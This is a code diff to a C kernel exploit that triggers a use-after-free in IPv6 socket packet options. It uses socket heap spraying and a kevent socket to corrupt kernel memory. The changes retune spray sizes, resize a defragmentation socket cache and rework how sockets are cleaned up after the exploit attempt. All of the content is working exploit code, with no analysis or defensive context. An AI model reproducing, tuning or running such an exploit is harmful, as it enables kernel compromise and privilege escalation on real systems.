@@ -21,7 +21,7 @@
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
 #define SPRAY_SIZE 64 // Needs trigger_uaf tweaking, NANOSLEEP_50US for 32, NANOSLEEP_75US for 64
-#define SPRAY_TOTAL 320
+#define SPRAY_TOTAL 256
 #define CLOSEUP_ARRAY_SIZE 512
 #define NEW_SOCKET() socket(AF_INET6, SOCK_DGRAM, 0)
 
@@ -48,8 +48,8 @@
 #define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
 #define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))
 
-// Reusable socket cache
-#define SOCKET_CACHE_SIZE 128
+// Dynamic socket cache
+#define SOCKET_CACHE_SIZE (DEFRAG_PASSES * (DEFRAG_SMALL_SOCKETS + DEFRAG_LARGE_SOCKETS))
 
 static int socket_cache[SOCKET_CACHE_SIZE];
 static int socket_cache_count = 0;
@@ -136,46 +136,15 @@ static inline void refrain_from_caching(int sock) {
     (void)sock;
 }
 
-typedef struct {
-    int master_sock;
-    int kevent_sock;
-    int* spray_sock;
-    int spray_count;
-} exploit_state_t;
-
-void comprehensive_cleanup(exploit_state_t* state) {
-    if (!state) return;
-
-    if (state->spray_sock) {
-        for (int i = 0; i < state->spray_count; i++) {
-            if (state->spray_sock[i] >= 0) {
-                safe_close_socket(state->spray_sock[i]);
-                state->spray_sock[i] = -1;
-            }
-        }
+void drain_socket_cache(void) {
+    while (socket_cache_count > 0) {
+        int s = socket_cache[--socket_cache_count];
+        socket_cache[socket_cache_count] = -1;
+        if (s >= 0)
+            safe_close_socket(s);
     }
-
-    if (state->kevent_sock >= 0) {
-        safe_close_socket(state->kevent_sock);
-        state->kevent_sock = -1;
-    }
-
-    if (state->master_sock >= 0) {
-        safe_close_socket(state->master_sock);
-        state->master_sock = -1;
-    }
-
-    if (socket_cache_initialized) {
-        while (socket_cache_count > 0) {
-            int s = socket_cache[--socket_cache_count];
-            socket_cache[socket_cache_count] = -1;
-            if (s >= 0)
-                safe_close_socket(s);
-        }
-    }
-
-    nanosleep(NANOSLEEP_100US, NULL);
 }
+
 
 struct opaque {
     volatile int triggered;
@@ -462,13 +431,6 @@ int main() {
             *(volatile int*)0;
     }
 
-    exploit_state_t cleanup_state = {
-        .master_sock = master_sock,
-        .kevent_sock = kevent_sock,
-        .spray_sock = spray_sock,
-        .spray_count = SPRAY_TOTAL
-    };
-
     struct opaque o = {
         .master_sock = master_sock,
         .kevent_sock = kevent_sock,
@@ -544,6 +506,8 @@ int main() {
         break;
     }
 
+    drain_socket_cache();
+
     int closeup_fds[CLOSEUP_ARRAY_SIZE];
 
     for (int i = 0; i < CLOSEUP_ARRAY_SIZE; i++)
@@ -587,9 +551,6 @@ int main() {
         nanosleep(NANOSLEEP_50US, NULL);
 
     }
-
-    if (!exploit_success)
-        comprehensive_cleanup(&cleanup_state);  // Only clean up if the exploit failed
 
     return exploit_success ? 0 : 1;
 }
